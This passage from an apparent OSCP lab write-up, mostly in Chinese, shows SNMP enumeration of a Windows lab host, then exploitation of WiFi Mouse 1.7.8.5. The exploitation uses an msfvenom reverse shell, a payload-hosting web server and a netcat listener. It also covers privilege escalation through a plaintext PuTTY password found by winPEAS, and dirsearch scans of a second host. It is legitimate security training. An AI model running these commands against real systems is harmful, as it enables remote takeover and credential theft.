|     Params: -k RPCSS -p
|   924:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k NetworkService -s TermService
|   956:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k DcomLaunch -p -s LSM
|   1004:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k netsvcs -p
|   1020:
|     Name: fontdrvhost.exe
|   1116:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s NcbService
|   1132:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalServiceNetworkRestricted -p -s TimeBrokerSvc
|   1164:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s AudioEndpointBuilder
|   1188:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalService -p -s DispBrokerDesktopSvc
|   1240:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k WbioSvcGroup -s WbioSrvc
|   1256:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalServiceNetworkRestricted -p -s EventLog
|   1284:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s UmRdpService
|   1308:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalService -p -s nsi
|   1336:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalService -p -s FontCache
|   1384:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalServiceNetworkRestricted -p -s Dhcp
|   1456:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -s CertPropSvc
|   1544:
|     Name: vm3dservice.exe
|     Path: C:\WINDOWS\system32\
|   1608:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k NetworkService -p -s LanmanWorkstation
|   1652:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s Schedule
|   1696:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s ProfSvc
|   1708:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k NetworkService -p -s NlaSvc
|   1720:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalSystemNetworkRestricted -p -s SysMain
|   1728:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalService -p -s EventSystem
|   1744:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k netsvcs -p -s Themes
|   1848:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s TrkWks
|   1864:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalService -p
|   1884:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalService -s W32Time
|   1932:
|     Name: Memory Compression
|   1960:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s SENS
|   1968:
|     Name: vmtoolsd.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1976:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k netsvcs -p -s SessionEnv
|   2060:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalService -p -s netprofm
|   2096:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k NetSvcs -p -s iphlpsvc
|   2124:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalServiceNetworkRestricted -p
|   2176:
|     Name: VGAuthService.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
|   2192:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k NetworkService -p -s Dnscache
|   2208:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalServiceNetworkRestricted -p
|   2228:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalServiceNetworkRestricted -p
|   2248:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s DsmSvc
|   2300:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k iissvcs
|   2368:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k netsvcs -p -s ShellHWDetection
|   2400:
|     Name: UserOOBEBroker.exe
|     Path: C:\Windows\System32\oobe\
|     Params: -Embedding
|   2440:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalServiceNetworkRestricted -p -s WinHttpAutoProxySvc
|   2500:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalService -p -s WdiServiceHost
|   2524:
|     Name: spoolsv.exe
|     Path: C:\WINDOWS\System32\
|   2544:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s UserManager
|   2580:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalServiceNoNetworkFirewall -p
|   2780:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s WpnService
|   2792:
|     Name: MsMpEng.exe
|   2856:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k apphost -s AppHostSvc
|   2864:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k NetworkService -p -s CryptSvc
|   2872:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k utcsvc -p
|   2888:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalServiceNoNetwork -p -s DPS
|   2904:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k ftpsvc -s ftpsvc
|   2928:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s Winmgmt
|   3012:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalService -p -s SstpSvc
|   3048:
|     Name: snmp.exe
|     Path: C:\WINDOWS\System32\
|   3056:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s LanmanServer
|   3228:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalSystemNetworkRestricted -p -s PcaSvc
|   3444:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k netsvcs
|   3628:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalServiceNetworkRestricted -p -s lmhosts
|   3736:
|     Name: conhost.exe
|     Path: \??\C:\WINDOWS\system32\
|     Params: 0x4
|   3744:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k NetworkServiceNetworkRestricted -p -s PolicyAgent
|   3808:
|     Name: dllhost.exe
|     Path: C:\WINDOWS\system32\
|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
|   3836:
|     Name: SgrmBroker.exe
|   3844:
|     Name: msdtc.exe
|     Path: C:\WINDOWS\System32\
|   3948:
|     Name: WmiPrvSE.exe
|     Path: C:\WINDOWS\system32\wbem\
|   4100:
|     Name: Mouse Server Luminati.exe
|   4120:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s UsoSvc
|   4200:
|     Name: CompatTelRunner.exe
|     Path: C:\WINDOWS\system32\
|   4292:
|     Name: MoUsoCoreWorker.exe
|     Path: C:\Windows\System32\
|     Params: -Embedding
|   4312:
|     Name: CompatTelRunner.exe
|     Path: C:\WINDOWS\system32\
|     Params: -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:TXta5t/3nUSUWE98.1
|   4360:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s Netman
|   4364:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s wuauserv
|   4608:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s StorSvc
|   4780:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k appmodel -p -s StateRepository
|   4800:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s WdiSystemHost
|   4888:
|     Name: svchost.exe
|   5044:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalServiceNetworkRestricted -s RmSvc
|   5092:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s DsSvc
|   5208:
|     Name: SearchIndexer.exe
|     Path: C:\WINDOWS\system32\
|     Params: /Embedding
|   5260:
|     Name: sihost.exe
|   5272:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k UnistackSvcGroup -s CDPUserSvc
|   5284:
|     Name: taskhostw.exe
|     Params: SYSTEM
|   5288:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k UnistackSvcGroup
|   5324:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k UnistackSvcGroup -s WpnUserService
|   5416:
|     Name: MouseServer.exe
|     Path: C:\Program Files (x86)\Mouse Server\
|   5432:
|     Name: MicrosoftEdgeUpdate.exe
|     Path: C:\Users\offsec\AppData\Local\Microsoft\EdgeUpdate\
|     Params: /c
|   5444:
|     Name: taskhostw.exe
|     Params: {222A245B-E637-4AE9-A93F-A59CA119A75E}
|   5472:
|     Name: MicrosoftEdgeUpdate.exe
|     Path: C:\Program Files (x86)\Microsoft\EdgeUpdate\
|     Params:  /c
|   5552:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k netsvcs -p -s TokenBroker
|   5644:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalSystemNetworkRestricted -p -s TabletInputService
|   5724:
|     Name: ctfmon.exe
|   5820:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k LocalService -p -s CDPSvc
|   5940:
|     Name: explorer.exe
|     Path: C:\WINDOWS\
|   6036:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -k ClipboardSvcGroup -p -s cbdhsvc
|   6192:
|     Name: StartMenuExperienceHost.exe
|     Path: C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\
|     Params:  -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
|   6256:
|     Name: RuntimeBroker.exe
|     Path: C:\Windows\System32\
|     Params: -Embedding
|   6260:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k smphost
|   6276:
|     Name: RuntimeBroker.exe
|     Path: C:\Windows\System32\
|     Params: -Embedding
|   6392:
|     Name: SearchApp.exe
|     Path: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\
|     Params:  -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca
|   6632:
|     Name: RuntimeBroker.exe
|     Path: C:\Windows\System32\
|     Params: -Embedding
|   7100:
|     Name: svchost.exe
|   7132:
|     Name: RuntimeBroker.exe
|     Path: C:\Windows\System32\
|     Params: -Embedding
|   7208:
|     Name: SecurityHealthService.exe
|   7308:
|     Name: SecurityHealthSystray.exe
|     Path: C:\Windows\System32\
|     Params:
|   7400:
|     Name: vmtoolsd.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|     Params:  -n vmusr
|   7444:
|     Name: vm3dservice.exe
|     Path: C:\Windows\System32\
|     Params:  -u
|   7468:
|     Name: OneDrive.exe
|     Path: C:\Users\offsec\AppData\Local\Microsoft\OneDrive\
|     Params:  /background
|   7592:
|     Name: svchost.exe
|   7720:
|     Name: ApplicationFrameHost.exe
|     Path: C:\WINDOWS\system32\
|     Params: -Embedding
|   7872:
|     Name: WinStore.App.exe
|     Path: C:\Program Files\WindowsApps\Microsoft.WindowsStore_12107.1001.15.0_x64__8wekyb3d8bbwe\
|     Params:  -ServerName:App.AppXc75wvwned5vhz4xyxxecvgdjhdkgsdza.mca
|   7984:
|     Name: dllhost.exe
|     Path: C:\WINDOWS\system32\
|     Params: /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
|   8020:
|     Name: WmiPrvSE.exe
|     Path: C:\WINDOWS\system32\wbem\
|   8088:
|     Name: svchost.exe
|     Path: C:\WINDOWS\System32\
|     Params: -k LocalService -p -s LicenseManager
|   8144:
|     Name: svchost.exe
|     Path: C:\WINDOWS\system32\
|_    Params: -k LocalServiceAndNoImpersonation -p -s SSDPSRV
| snmp-win32-services:
|   Application Host Helper Service
|   Background Intelligent Transfer Service
|   Background Tasks Infrastructure Service
|   Base Filtering Engine
|   CNG Key Isolation
|   COM+ Event System
|   COM+ System Application
|   Certificate Propagation
|   Client License Service (ClipSVC)
|   Clipboard User Service_6a6c7
|   Connected Devices Platform Service
|   Connected Devices Platform User Service_6a6c7
|   Connected User Experiences and Telemetry
|   CoreMessaging
|   Credential Manager
|   Cryptographic Services
|   DCOM Server Process Launcher
|   DHCP Client
|   DNS Client
|   Data Sharing Service
|   Data Usage
|   Device Setup Manager
|   Diagnostic Policy Service
|   Diagnostic Service Host
|   Diagnostic System Host
|   Display Policy Service
|   Distributed Link Tracking Client
|   Distributed Transaction Coordinator
|   IP Helper
|   IPsec Policy Agent
|   Local Session Manager
|   Microsoft Defender Antivirus Service
|   Microsoft FTP Service
|   Microsoft Software Shadow Copy Provider
|   Microsoft Storage Spaces SMP
|   Microsoft Store Install Service
|   Network Connection Broker
|   Network Connections
|   Network List Service
|   Network Location Awareness
|   Network Store Interface Service
|   Payments and NFC/SE Manager
|   Plug and Play
|   Power
|   Print Spooler
|   Program Compatibility Assistant Service
|   RPC Endpoint Mapper
|   Radio Management Service
|   Remote Access Connection Manager
|   Remote Desktop Configuration
|   Remote Desktop Services
|   Remote Desktop Services UserMode Port Redirector
|   Remote Procedure Call (RPC)
|   SNMP Service
|   SSDP Discovery
|   Secure Socket Tunneling Protocol Service
|   Security Accounts Manager
|   Security Center
|   Server
|   Shell Hardware Detection
|   State Repository Service
|   Storage Service
|   Sync Host_6a6c7
|   SysMain
|   System Event Notification Service
|   System Events Broker
|   System Guard Runtime Monitor Broker
|   TCP/IP NetBIOS Helper
|   Task Scheduler
|   Themes
|   Time Broker
|   Touch Keyboard and Handwriting Panel Service
|   Update Orchestrator Service
|   User Manager
|   User Profile Service
|   VMware Alias Manager and Ticket Service
|   VMware SVGA Helper Service
|   VMware Tools
|   Web Account Manager
|   WinHTTP Web Proxy Auto-Discovery Service
|   Windows Audio
|   Windows Audio Endpoint Builder
|   Windows Biometric Service
|   Windows Connection Manager
|   Windows Defender Firewall
|   Windows Event Log
|   Windows Font Cache Service
|   Windows License Manager Service
|   Windows Management Instrumentation
|   Windows Process Activation Service
|   Windows Push Notifications System Service
|   Windows Push Notifications User Service_6a6c7
|   Windows Search
|   Windows Security Service
|   Windows Time
|   Windows Update
|   Workstation
|_  World Wide Web Publishing Service
| snmp-interfaces:
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Microsoft 6to4 Adapter\x00
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (PPTP)\x00
|     Type: tunnel  Speed: 0 Kbps
|     Status: down
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Microsoft Kernel Debug Network Adapter\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Microsoft IP-HTTPS Platform Adapter\x00
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (IPv6)\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (IP)\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (Network Monitor)\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (L2TP)\x00
|     Type: tunnel  Speed: 0 Kbps
|     Status: down
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (PPPOE)\x00
|     Type: ppp  Speed: 0 Kbps
|     Status: down
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Microsoft Teredo Tunneling Adapter\x00
|     Type: tunnel  Speed: 0 Kbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (IKEv2)\x00
|     Type: tunnel  Speed: 0 Kbps
|     Status: down
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (SSTP)\x00
|     Type: tunnel  Speed: 0 Kbps
|     Status: down
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   vmxnet3 Ethernet Adapter\x00
|     IP address: 192.168.234.145  Netmask: 255.255.255.0
|     MAC address: 00:50:56:9e:04:4e (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|     Traffic stats: 314.81 Kb sent, 605.11 Kb received
|   vmxnet3 Ethernet Adapter-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:9e:04:4e (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|     Traffic stats: 314.81 Kb sent, 605.11 Kb received
|   vmxnet3 Ethernet Adapter-QoS Packet Scheduler-0000\x00
|     MAC address: 00:50:56:9e:04:4e (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|     Traffic stats: 314.81 Kb sent, 605.11 Kb received
|   vmxnet3 Ethernet Adapter-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:9e:04:4e (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|     Traffic stats: 314.81 Kb sent, 605.11 Kb received
|   WAN Miniport (IP)-WFP Native MAC Layer LightWeight Filter-0000\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (IP)-QoS Packet Scheduler-0000\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (IPv6)-WFP Native MAC Layer LightWeight Filter-0000\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (IPv6)-QoS Packet Scheduler-0000\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (Network Monitor)-WFP Native MAC Layer LightWeight Filter-0000\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Status: up
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   WAN Miniport (Network Monitor)-QoS Packet Scheduler-0000\x00
|     Type: ethernetCsmacd  Speed: 0 Kbps
|     Status: up
|_    Traffic stats: 0.00 Kb sent, 0.00 Kb received
| snmp-win32-software:
|   Microsoft Edge; 2023-02-24T06:08:12
|   Microsoft Edge Update; 2023-03-02T01:34:30
|   Microsoft Edge WebView2 Runtime; 2023-02-24T06:08:48
|   Microsoft Update Health Tools; 2023-01-05T05:04:48
|   Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.24.281; 2023-01-05T05:04:50
|   Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.24.281; 2023-01-05T05:04:50
|   Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127; 2023-01-05T05:04:48
|   Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127; 2023-01-05T05:04:48
|   Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127; 2023-01-05T05:04:50
|   Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127; 2023-01-05T05:04:50
|   Mouse Server version 1.7.8.5; 2023-01-05T05:04:50
|   PuTTY release 0.76 (64-bit); 2023-01-05T05:04:48
|   Update for Windows 10 for x64-based Systems (KB5001716); 2023-01-05T05:04:48
|_  VMware Tools; 2023-01-05T05:04:48
| snmp-netstat:
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:1978         0.0.0.0:0
|   TCP  0.0.0.0:3389         0.0.0.0:0
|   TCP  0.0.0.0:5040         0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  192.168.234.145:139  0.0.0.0:0
|   TCP  192.168.234.145:63229 40.127.169.103:443
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:2007         *:*
|   UDP  0.0.0.0:3389         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  127.0.0.1:1900       *:*
|   UDP  127.0.0.1:54072      *:*
|   UDP  127.0.0.1:64894      *:*
|   UDP  192.168.234.145:137  *:*
|   UDP  192.168.234.145:138  *:*
|   UDP  192.168.234.145:1900 *:*
|_  UDP  192.168.234.145:64893 *:*
| snmp-win32-users:
|   Administrator
|   DefaultAccount
|   Guest
|   WDAGUtilityAccount
|   offsec
|_  zachary
| snmp-sysdescr: Hardware: AMD64 Family 25 Model 1 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 19041 Multiprocessor Free)
|_  System uptime: 16d14h52m15.76s (143593576 timeticks)

Nmap done: 1 IP address (1 host up) scanned in 591.16 seconds
```

查看 snmp win32 software 是否有漏洞可利用
```json
| snmp-win32-software:
|   Microsoft Edge; 2023-02-24T06:08:12
|   Microsoft Edge Update; 2023-03-02T01:34:30
|   Microsoft Edge WebView2 Runtime; 2023-02-24T06:08:48
|   Microsoft Update Health Tools; 2023-01-05T05:04:48
|   Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.24.281; 2023-01-05T05:04:50
|   Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.24.281; 2023-01-05T05:04:50
|   Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127; 2023-01-05T05:04:48
|   Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127; 2023-01-05T05:04:48
|   Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127; 2023-01-05T05:04:50
|   Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127; 2023-01-05T05:04:50
|   Mouse Server version 1.7.8.5; 2023-01-05T05:04:50
|   PuTTY release 0.76 (64-bit); 2023-01-05T05:04:48
|   Update for Windows 10 for x64-based Systems (KB5001716); 2023-01-05T05:04:48
|_  VMware Tools; 2023-01-05T05:04:48
```

發現 mouse server 1.7.8.5 有個 rce 漏洞
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/145]
└─$ searchsploit "Mouse Server 1.7.8.5"
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)                                             | windows/remote/50972.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

	重連 VPN，IP 換成 192.168.240.xxx & 10.10.130.xxx

查看 50972.py 後，照著使用方法先用 msfvenom 建立一個 shell exe file

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.213 LPORT=5555 -f exe -o reverse_shell.exe
```

開啟 python web server，同時也開啟 nc 監聽

```bash
python3 -m http.server 8000
```

再執行 50972.py

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/145]
└─$ python3 50972.py 192.168.240.145 192.168.45.213:8000 reverse_shell.exe
[+] 3..2..1..
[+] *Super fast hacker typing*
[+] Retrieving payload
[+] Done! Check Your Listener?
```

```json
┌──(ouyang㉿kali)-[~]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.240.145] 63086
Microsoft Windows [Version 10.0.19041.1]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

get shell!


### 145 提權

把 winPEASx64.exe & winPEAS.bat 丟到把機上嘗試執行並查看結果，發現疑似 zachary 密碼
```json
����������͹ Putty Sessions
    RegKey Name: zachary
    RegKey Value: "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
   =================================================================================================
```

並確認 zachary 為 administrator groups 成員

```json
 [+] ADMINISTRATORS GROUPS
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
zachary
```

使用 xfreerdp 成功登入
```bash
xfreerdp /u:zachary /v:192.168.240.145 /p:Th3R@tC@tch3r /size:90% /cert-ignore
```

![[截圖 2023-07-30 下午7.21.06.png]]![[截圖 2023-07-30 下午7.21.37.png]] get proof.txt!!!

## 141

首先使用 dirsearch 針對 80 & 81 port 掃描

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/141]
└─$ dirsearch -u http://192.168.240.141/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15490

Output File: /home/ouyang/.dirsearch/reports/192.168.240.141/-_23-07-30_19-26-31.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-07-30_19-26-31.log

Target: http://192.168.240.141/

[19:26:32] Starting:
[19:26:38] 403 -  290B  - /%C0%AE%C0%AE%C0%AF
[19:26:38] 403 -  290B  - /%3f/
[19:26:41] 403 -  290B  - /%ff
[19:26:50] 403 -  290B  - /.htaccess.bak1
[19:26:50] 403 -  290B  - /.htaccess_extra
[19:26:50] 403 -  290B  - /.htaccess_orig
[19:26:50] 403 -  290B  - /.htpasswds
[19:26:50] 403 -  290B  - /.htaccess.sample
[19:26:50] 403 -  290B  - /.ht_wsr.txt
[19:26:50] 403 -  290B  - /.htaccess.save
[19:26:50] 403 -  290B  - /.httr-oauth
[19:26:50] 403 -  290B  - /.htaccessOLD2
[19:26:50] 403 -  290B  - /.htaccess.orig
[19:26:50] 403 -  290B  - /.htaccessBAK
[19:26:50] 403 -  290B  - /.htaccess_sc
[19:26:50] 403 -  290B  - /.htaccessOLD
[19:26:51] 403 -  290B  - /.html
[19:26:51] 403 -  290B  - /.htm
[19:26:51] 403 -  290B  - /.htpasswd_test
[19:27:16] 403 -  290B  - /Trace.axd::$DATA
[19:27:59] 403 -  290B  - /adminer/adminer.php
[19:28:00] 403 -  290B  - /adminer/
[19:28:22] 200 -    2KB - /blog/
[19:28:22] 301 -  327B  - /blog  ->  http://192.168.240.141/blog/
[19:28:25] 403 -  290B  - /cgi-bin/
[19:28:25] 500 -  633B  - /cgi-bin/printenv.pl
[19:28:56] 200 -   31KB - /home
[19:28:56] 200 -   36KB - /home.html
[19:28:57] 301 -  329B  - /images  ->  http://192.168.240.141/images/
[19:28:57] 200 -    6KB - /images/
[19:28:59] 403 -  290B  - /index.php::$DATA
[19:28:59] 200 -   36KB - /index
[19:28:59] 200 -   36KB - /index.html
[19:29:22] 403 -  290B  - /phpmyadmin/ChangeLog
[19:29:22] 403 -  290B  - /phpmyadmin/docs/html/index.html
[19:29:22] 403 -  290B  - /phpmyadmin/doc/html/index.html
[19:29:22] 403 -  290B  - /phpmyadmin/README
[19:29:23] 403 -  290B  - /phpmyadmin
[19:29:25] 403 -  290B  - /phpmyadmin/
[19:29:25] 403 -  290B  - /phpmyadmin/scripts/setup.php
[19:29:25] 403 -  290B  - /phpmyadmin/phpmyadmin/index.php
[19:29:25] 403 -  290B  - /phpmyadmin/index.php
[19:29:25] 403 -  290B  - /phpsysinfo/
[19:29:35] 301 -  329B  - /script  ->  http://192.168.240.141/script/
[19:29:35] 200 -    1KB - /script/
[19:29:55] 403 -  290B  - /web.config::$DATA

Task Completed

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_A/141]
└─$ dirsearch -u http://192.168.240.141:81/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15490

